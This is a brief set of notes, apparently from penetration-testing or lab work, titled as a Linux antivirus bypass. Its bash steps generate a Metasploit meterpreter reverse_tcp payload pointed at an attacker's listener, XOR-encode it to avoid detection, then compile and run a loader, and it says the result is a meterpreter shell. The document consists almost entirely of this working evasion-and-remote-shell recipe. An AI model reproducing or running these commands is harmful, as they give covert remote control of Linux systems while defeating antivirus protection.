# Linux Antivirus payload bypass
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.130.128 LPORT=4445 -f raw > linux.bin
python3 xorenc.py linux.bin
gcc -o lin.out lin.c
./lin.out
```
The payload will execute and we get a meterpreter shell
